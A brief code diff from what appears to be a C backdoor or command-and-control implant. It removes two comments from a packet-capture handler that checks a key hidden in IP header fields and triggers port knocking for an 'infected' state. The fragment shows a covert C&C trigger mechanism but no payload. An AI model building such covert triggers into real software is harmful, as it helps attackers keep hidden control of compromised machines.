@@ -83,8 +83,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
     if(ip->ip_p == IPPROTO_UDP){
 
         if(CheckKey(ip->ip_tos, ip->ip_id, true)){
-            //only CNC will get into this loop
-            //port knocking packet
             if(Filter->infected == false){
                 PortKnocking(Filter, pkthdr, packet, false, false);
 
